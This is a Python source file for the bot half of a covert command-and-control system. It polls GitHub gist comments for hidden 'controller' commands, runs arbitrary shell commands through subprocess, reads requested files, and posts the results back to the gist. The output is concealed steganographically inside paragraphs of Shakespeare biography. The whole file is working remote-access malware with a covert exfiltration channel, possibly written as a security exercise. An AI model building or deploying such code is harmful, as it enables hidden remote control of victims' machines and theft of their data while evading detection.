import gist_utils

import subprocess as sp
import socket
from apscheduler.schedulers.background import BackgroundScheduler
import atexit


# Cover message hiding the response of bots to supported commands

supportedCommandsCovers = {} # command_name : cover_message_to_hide_command_output_into
supportedCommandsCovers["exec"] = "William Shakespeare (bapt. 26 April 1564 - 23 April 1616) was an English playwright, poet and actor. "\
                               "He is widely regarded as the greatest writer in the English language and the world's pre-eminent dramatist. "\
                               "He is often called England's national poet and the 'Bard of Avon' (or simply 'the Bard'). His extant works, "\
                               "including collaborations, consist of some 39 plays, 154 sonnets, three long narrative poems, and a few other "\
                               "verses, some of uncertain authorship. His plays have been translated into every major living language and are "\
                               "performed more often than those of any other playwright. He remains arguably the most influential writer in the "\
                               "English language, and his works continue to be studied and reinterpreted."
supportedCommandsCovers["id"] = "Shakespeare was born and raised in Stratford-upon-Avon, Warwickshire. At the age of 18, he married Anne "\
                                "Hathaway, with whom he had three children: Susanna, and twins Hamnet and Judith. Sometime between 1585 and "\
                                "1592, he began a successful career in London as an actor, writer, and part-owner of a playing company called "\
                                "the Lord Chamberlain's Men, later known as the King's Men. At age 49 (around 1613), he appears to have retired "\
                                "to Stratford, where he died three years later. Few records of Shakespeare's private life survive; this has "\
                                "stimulated considerable speculation about such matters as his physical appearance, his sexuality, his religious "\
                                "beliefs and whether the works attributed to him were written by others."
supportedCommandsCovers["ls"] = "Shakespeare produced most of his known works between 1589 and 1613. His early plays were primarily "\
                                "comedies and histories and are regarded as some of the best works produced in these genres. He then wrote mainly "\
                                "tragedies until 1608, among them Hamlet, Romeo and Juliet, Othello, King Lear, and Macbeth, all considered to be "\
                                "among the finest works in the English language. In the last phase of his life, he wrote tragicomedies "\
                                "(also known as romances) and collaborated with other playwrights. Many of Shakespeare's plays were published in "\
                                "editions of varying quality and accuracy in his lifetime. However, in 1623, John Heminges and Henry Condell, two "\
                                "fellow actors and friends of Shakespeare's, published a more definitive text known as the First Folio, a posthumous "\
                                "collected edition of Shakespeare's dramatic works that included all but two of his plays. Its Preface was a "\
                                "prescient poem by Ben Jonson, a former rival of Shakespeare, that hailed Shakespeare with the now famous epithet: "\
                                "'not of an age, but for all time'."
supportedCommandsCovers["w"] = "Shakespeare died on 23 April 1616, at the age of 52. He died within a month of signing his will, a document "\
                                 "which he begins by describing himself as being in 'perfect health'. No extant contemporary source explains "\
                                 "how or why he died. Half a century later, John Ward, the vicar of Stratford, wrote in his notebook: 'Shakespeare, "\
                                 "Drayton, and Ben Jonson had a merry meeting and, it seems, drank too hard, for Shakespeare died of a fever "\
                                 "there contracted', not an impossible scenario since Shakespeare knew Jonson and Drayton. Of the tributes from "\
                                 "fellow authors, one refers to his relatively sudden death: 'We wondered, Shakespeare, that thou went'st so soon. "\
                                 "From the world's stage to the grave's tiring room.'"
supportedCommandsCovers["file"] = "In his final period, Shakespeare turned to romance or tragicomedy and completed three more major plays: "\
                                  "Cymbeline, The Winter's Tale, and The Tempest, as well as the collaboration, Pericles, Prince of Tyre. "\
                                  "Less bleak than the tragedies, these four plays are graver in tone than the comedies of the 1590s, but "\
                                  "they end with reconciliation and the forgiveness of potentially tragic errors. Some commentators have seen "\
                                  "this change in mood as evidence of a more serene view of life on Shakespeare's part, but it may merely "\
                                  "reflect the theatrical fashion of the day. Shakespeare collaborated on two further surviving plays, Henry "\
                                  "VIII and The Two Noble Kinsmen, probably with John Fletcher."


class Bot:

    def __init__(self, id : int, host : str, port : int) -> None:
        self.id = id
        self.host = host
        self.port = port

    # Checking for new gist comments (every 5 seconds), executing commands
    # from the controller and sending back the output of these commands
    def checkNewGistComments(self, gistUrl) -> None:
        lastComment = gist_utils.fetchLastComment(gistUrl)
        if lastComment and lastComment["id"] != self.lastAnsweredCommentId:
            secret = gist_utils.decodeMessage(lastComment["body"])
            if secret.startswith("controller:"):
                secretSplit = secret.split()[1:]
                if secretSplit[-1] == self.id:
                    message = None
                    if secretSplit[0] == "exec":
                        message = self.getCmdOutput(secretSplit[1])
                    elif secretSplit[0] == "file":
                        message = self.getFileContents(secretSplit[1])
                    else:
                        message = self.getCmdOutput(" ".join(secretSplit[:-1]))
                    gist_utils.addComment(gistUrl, gist_utils.encodeMessage(supportedCommandsCovers[secretSplit[0]], f"bot: {message}"))
                    self.lastAnsweredCommentId = lastComment["id"]
    
    def startNewCommentsListener(self, gistUrl : str) -> None:
        self.gistCommentsListener = BackgroundScheduler()
        atexit.register(lambda : self.gistCommentsListener.shutdown())
        self.gistCommentsListener.add_job(func = self.checkNewGistComments, args = (gistUrl,), trigger = "interval", seconds = 5)
        self.gistCommentsListener.start()
        self.lastAnsweredCommentId = -1

    def start(self) -> None:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.host, self.port))
            s.listen()
            while True:
                s.accept()

    def getCmdOutput(self, cmd : str) -> str:
        return sp.getoutput(cmd)
    
    def getFileContents(self, filePath : str) -> str:
        try:
            with open(filePath, "r") as f:
                return f.read()
        except Exception:
            return f"{filePath}: No such file"